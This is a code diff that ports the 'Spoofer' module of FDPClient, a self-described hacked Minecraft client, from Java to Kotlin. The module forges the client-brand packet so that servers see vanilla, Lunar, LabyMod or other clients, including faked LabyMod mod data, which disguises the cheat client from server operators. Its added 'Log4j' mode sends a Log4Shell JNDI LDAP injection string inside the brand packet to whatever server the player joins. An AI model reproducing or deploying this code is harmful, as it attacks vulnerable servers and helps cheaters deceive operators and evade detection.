@@ -3,51 +3,203 @@
  * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge by LiquidBounce.
  * https://github.com/SkidderMC/FDPClient/
  */
-package net.ccbluex.liquidbounce.features.module.modules.client;
+package net.ccbluex.liquidbounce.features.module.modules.client
 
-import net.ccbluex.liquidbounce.features.module.Module;
-import net.ccbluex.liquidbounce.features.module.ModuleCategory;
-import net.ccbluex.liquidbounce.features.module.ModuleInfo;
-import net.ccbluex.liquidbounce.features.module.modules.client.button.*;
-import net.ccbluex.liquidbounce.value.ListValue;
-import net.ccbluex.liquidbounce.value.TextValue;
-import net.minecraft.client.gui.GuiButton;
+import io.netty.buffer.Unpooled
+import net.ccbluex.liquidbounce.event.EventTarget
+import net.ccbluex.liquidbounce.event.PacketEvent
+import net.ccbluex.liquidbounce.features.module.Module
+import net.ccbluex.liquidbounce.features.module.ModuleCategory
+import net.ccbluex.liquidbounce.features.module.ModuleInfo
+import net.ccbluex.liquidbounce.features.module.modules.client.button.*
+import net.ccbluex.liquidbounce.utils.PacketUtils
+import net.ccbluex.liquidbounce.utils.misc.RandomUtils
+import net.ccbluex.liquidbounce.value.ListValue
+import net.ccbluex.liquidbounce.value.TextValue
+import net.minecraft.client.gui.GuiButton
+import net.minecraft.network.PacketBuffer
+import net.minecraft.network.play.client.C17PacketCustomPayload
+import java.util.*
 
-@ModuleInfo(name = "Spoofer", category = ModuleCategory.CLIENT, defaultOn = true)
-public class ClientSpoof extends Module {
+/**
+ * The type Client spoof.
+ */
+@ModuleInfo(name = "Spoofer",  category = ModuleCategory.CLIENT, defaultOn = true, forceNoSound = true)
+class ClientSpoof : Module() {
+    /**
+     * The Mode value.
+     */
+    val modeValue = ListValue(
+        "Mode", arrayOf(
+            "Vanilla",
+            "OptiFine",
+            "Fabric",
+            "Lunar",
+            "LabyMod",
+            "CheatBreaker",
+            "PvPLounge",
+            "Geyser",
+            "Log4j",
+            "Custom"
+        ), "Vanilla"
+    )
 
-    public final ListValue modeValue = new ListValue("Payloads", new String[]{"Vanilla", "Fabric", "Lunar", "LabyMod", "Custom", "CheatBreaker", "PvPLounge"}, "Lunar");
-    public final TextValue CustomClient = new TextValue("CustomClientSpoof", "CustomClient");
-    public final ListValue buttonValue = new ListValue("Button", new String[]{"Better", "RGBRounded", "Wolfram", "Rounded", "Hyperium", "RGB", "Badlion", "PVP", "Flat", "FLine", "Rise", "Vanilla"}, "PVP");
-    public AbstractButtonRenderer getButtonRenderer(GuiButton button) {
-        String lowerCaseButtonValue = buttonValue.get().toLowerCase();
-        switch (lowerCaseButtonValue) {
-            case "better":
-                return new BetterButtonRenderer(button);
-            case "rounded":
-                return new RoundedButtonRenderer(button);
-            case "fline":
-                return new FLineButtonRenderer(button);
-            case "rise":
-                return new RiseButtonRenderer(button);
-            case "hyperium":
-                return new HyperiumButtonRenderer(button);
-            case "rgb":
-                return new RGBButtonRenderer(button);
-            case "badlion":
-                return new BadlionTwoButtonRenderer(button);
-            case "rgbrounded":
-                return new RGBRoundedButtonRenderer(button);
-            case "wolfram":
-                return new WolframButtonRenderer(button);
-            case "pvp":
-                return new PvPClientButtonRenderer(button);
-            default:
-                return null; // vanilla or unknown
+    private val customValue = TextValue("Custom-Brand", "WTF").displayable { modeValue.get().equals("custom", true) }
+
+    val buttonValue = ListValue(
+        "Button",
+        arrayOf(
+            "Better",
+            "RGBRounded",
+            "Wolfram",
+            "Rounded",
+            "Hyperium",
+            "RGB",
+            "Badlion",
+            "PVP",
+            "Flat",
+            "FLine",
+            "Rise",
+            "Vanilla"
+        ),
+        "PVP"
+    )
+
+    fun getButtonRenderer(button: GuiButton?): AbstractButtonRenderer? {
+        val lowerCaseButtonValue = buttonValue.get().lowercase(Locale.getDefault())
+        return when (lowerCaseButtonValue) {
+            "better" -> BetterButtonRenderer(button!!)
+            "rounded" -> RoundedButtonRenderer(button!!)
+            "fline" -> FLineButtonRenderer(button!!)
+            "rise" -> RiseButtonRenderer(button!!)
+            "hyperium" -> HyperiumButtonRenderer(button!!)
+            "rgb" -> RGBButtonRenderer(button!!)
+            "badlion" -> BadlionTwoButtonRenderer(button!!)
+            "rgbrounded" -> RGBRoundedButtonRenderer(button!!)
+            "wolfram" -> WolframButtonRenderer(button!!)
+            "pvp" -> PvPClientButtonRenderer(button!!)
+            else -> null // vanilla or unknown
         }
     }
-    @Override
-    public String getTag() {
-        return modeValue.get();
+
+    @EventTarget
+    fun onPacket(event: PacketEvent) {
+        val packet = event.packet
+        if (!mc.isIntegratedServerRunning) {
+            if (packet is C17PacketCustomPayload) {
+                if ((event.packet as C17PacketCustomPayload).channelName.equals("MC|Brand", ignoreCase = true)) {
+                    when (modeValue.get()) {
+                        "Vanilla" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("vanilla")
+                            )
+                        )
+
+                        "OptiFine" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("optifine")
+                            )
+                        )
+
+                        "Fabric" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("fabric")
+                            )
+                        )
+
+                        "LabyMod" -> {
+                            mc.netHandler.addToSendQueue(C17PacketCustomPayload("labymod3:main", getInfo()))
+                            mc.netHandler.addToSendQueue(C17PacketCustomPayload("LMC", getInfo()))
+                        }
+
+                        "CheatBreaker" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("CB")
+                            )
+                        )
+
+                        "PvPLounge" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("PLC18")
+                            )
+                        )
+
+                        "Geyser" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("eyser")
+                            )
+                        )
+
+                        "Lunar" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString("lunarclient:v2.12.3-2351")
+                            )
+                        )
+
+                        "Log4j" -> {
+                            val str =
+                                "\${jndi:ldap://192.168.${RandomUtils.nextInt(1, 253)}.${RandomUtils.nextInt(1, 253)}}"
+                            PacketUtils.sendPacketNoEvent(
+                                C17PacketCustomPayload(
+                                    "MC|Brand",
+                                    PacketBuffer(Unpooled.buffer()).writeString(
+                                        "${RandomUtils.randomString(5)}$str${
+                                            RandomUtils.randomString(
+                                                5
+                                            )
+                                        }"
+                                    )
+                                )
+                            )
+                        }
+
+                        "Custom" -> PacketUtils.sendPacketNoEvent(
+                            C17PacketCustomPayload(
+                                "MC|Brand",
+                                PacketBuffer(Unpooled.buffer()).writeString(customValue.get())
+                            )
+                        )
+                    }
+                }
+                event.cancelEvent()
+            }
+        }
+    }
+
+    private fun getInfo(): PacketBuffer {
+        return PacketBuffer(Unpooled.buffer())
+            .writeString("INFO")
+            .writeString(
+                "{  \n" +
+                        "   \"version\": \"3.9.25\",\n" +
+                        "   \"ccp\": {  \n" +
+                        "      \"enabled\": true,\n" +
+                        "      \"version\": 2\n" +
+                        "   },\n" +
+                        "   \"shadow\":{  \n" +
+                        "      \"enabled\": true,\n" +
+                        "      \"version\": 1\n" +
+                        "   },\n" +
+                        "   \"addons\": [  \n" +
+                        "      {  \n" +
+                        "         \"uuid\": \"null\",\n" +
+                        "         \"name\": \"null\"\n" +
+                        "      }\n" +
+                        "   ],\n" +
+                        "   \"mods\": [\n" +
+                        "      {  \n" +
+                        "         \"hash\":\"sha256:null\",\n" +
+                        "         \"name\":\"null.jar\"\n" +
+                        "      }\n" +
+                        "   ]\n" +
+                        "}"
+            )
     }
 }
